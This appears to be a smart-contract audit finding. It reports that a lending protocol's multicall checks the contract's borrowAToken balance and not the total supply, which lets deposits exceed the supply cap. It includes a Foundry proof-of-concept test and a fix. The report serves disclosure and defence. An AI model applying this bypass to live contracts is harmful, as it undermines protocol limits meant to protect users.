# Vulnerability details

## Impact
The `borrowAToken` has a total supply cap it should not go over. In reality, the total supply can go over the specified cap.

## Proof of Concept
Whenever a user deposits into the system, he calls `deposit()` which then validates the provided params and calls `executeDeposit()` on the `Deposit.sol` library.
This is a part of the function that is responsible for handling the case where a user has deposited a borrow token:
```solidity
if (params.token == address(state.data.underlyingBorrowToken)) {
            state.depositUnderlyingBorrowTokenToVariablePool(from, params.to, amount);
            if (!state.data.isMulticall) {
                state.validateBorrowATokenCap();
            }
        }
```
The `depositUnderlyingBorrowTokenToVariablePool()` function that is called sends the token from the `from` (msg.sender in this case) address to the contract, then deposits those tokens into AAVE for extra yield and it mints `borrowAToken` based on the increase of `aToken` received from AAVE.

Then, we validate whether this function is called through `multicall()` and if it isn't, then we validate whether the total supply of `borrowAToken` is less or equal to the `borrowATokenCap` and reverts otherwise.

If this is a multicall, then this gets skipped as a user could be doing debt reduction operations and that check would disallow the user from doing so in certain cases. Instead, the `Multicall` library has a way of dealing with this.
```solidity
    function multicall(State storage state, bytes[] calldata data) internal returns (bytes[] memory results) {
        state.data.isMulticall = true;

        uint256 borrowATokenSupplyBefore = state.data.borrowAToken.balanceOf(address(this));
        uint256 debtTokenSupplyBefore = state.data.debtToken.totalSupply();

        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }

        uint256 borrowATokenSupplyAfter = state.data.borrowAToken.balanceOf(address(this));
        uint256 debtTokenSupplyAfter = state.data.debtToken.totalSupply();

        state.validateBorrowATokenIncreaseLteDebtTokenDecrease(
            borrowATokenSupplyBefore, debtTokenSupplyBefore, borrowATokenSupplyAfter, debtTokenSupplyAfter
        );

        state.data.isMulticall = false;
    }
```
We get the supplies of `borrowAToken` and `debtToken` before and after the calls and we check whether the decrease of debt is lower or equal to the increase of supply and we revert otherwise.

The issue is because of these 2 lines:
```solidity
uint256 borrowATokenSupplyBefore = state.data.borrowAToken.balanceOf(address(this));
uint256 borrowATokenSupplyAfter = state.data.borrowAToken.balanceOf(address(this));
```
They are using the balance of the contract when they should be using the total supply of the token. Whenever a user deposits tokens into the system using `multicall()`, we would end up here and compare the balance of the contract before and after the calls. The only way where the before and after balances would be different (in this particular case at least) is whenever the `borrowAToken` is minted to the contract which would pretty much never be the case. Thus, this value will always be 0 and will lead to the comparison between the debt decrease and supply increase to never lead to a revert (`borrowATokenSupplyIncrease` will never be of greater value than `debtATokenSupplyDecrease` as the former would always be 0):
```solidity
if (borrowATokenSupplyIncrease > debtATokenSupplyDecrease) {
                // revert
                revert Errors.BORROW_ATOKEN_INCREASE_EXCEEDS_DEBT_TOKEN_DECREASE(
                    borrowATokenSupplyIncrease, debtATokenSupplyDecrease
                );
            }
```

This can cause any user to bypass the cap at will.

Import the following into `Multicall.t.sol`:
```solidity
import {DataView} from "@src/SizeViewData.sol";
import {InitializeRiskConfigParams} from "@src/libraries/actions/Initialize.sol";
```
Then, paste the following POC in the same file:
```solidity
function testCanBypassCap() public {
        DataView memory dataView = size.data(); // IMPORT
        uint256 borrowASizeBalanceBefore = dataView.borrowAToken.balanceOf(address(size));

        _setPrice(1e18);
        uint256 amount = 100e6;
        uint256 cap = amount;
        _updateConfig("borrowATokenCap", cap); // Set the cap to 100e6

        InitializeRiskConfigParams memory riskParams = size.riskConfig();
        assertEq(riskParams.borrowATokenCap, cap);

        _deposit(alice, usdc, cap); // Deposit 100e6 as Alice

        assertEq(dataView.borrowAToken.totalSupply(), cap); // Now the cap is reached (100e6)

        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeCall(size.deposit, DepositParams({token: address(usdc), amount: 1, to: alice})); // Craft deposit params with 1 as amount

        _mint(address(usdc), alice, 1); // Mint 1 token to Alice
        _approve(alice, address(usdc), address(size), 1); // Approve the size contract for 1 token
        vm.prank(alice);
        size.multicall(data); // Deposit using multicall with the data

        assertEq(dataView.borrowAToken.totalSupply(), cap + 1); // Now the total supply is cap + 1

        uint256 borrowASizeBalanceAfter = dataView.borrowAToken.balanceOf(address(size));

        assertEq(borrowASizeBalanceBefore, 0);
        assertEq(borrowASizeBalanceAfter, 0); // Both are 0 as no changes occured
    }
```

## Recommended Mitigation Steps
Use `totalSupply` instead of the balance or use the balance of the tokens receiver instead of `address(this)`
